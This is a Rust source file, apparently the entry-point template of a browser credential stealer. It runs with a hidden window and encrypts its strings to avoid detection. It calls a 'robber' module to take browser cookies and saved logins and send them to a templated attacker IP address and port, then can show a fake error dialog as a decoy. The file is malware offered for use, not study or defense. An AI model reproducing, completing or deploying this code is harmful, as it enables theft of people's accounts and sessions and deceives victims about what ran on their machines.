#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod robber;
use litcrypt::{lc, use_litcrypt};
use std::ffi::CString;
use user32::MessageBoxA;

use_litcrypt!("<<SECRET_KEY>>");

fn main() -> () {
    let error: bool = <<ERROR_BOOL>>;
    let error_message = r#"<<ERROR_MESSAGE>>"#;
    let _ = browser::run_robber(<<COOKIES_BOOL>>, <<LOGIN_BOOL>>, &lc!("http://<<IP_ADDRESS>>:<<PORT>>"));
    if error == true {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, ()> {
    let title = CString::new("Error!").unwrap();
    let message = CString::new(error_message).unwrap();
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}
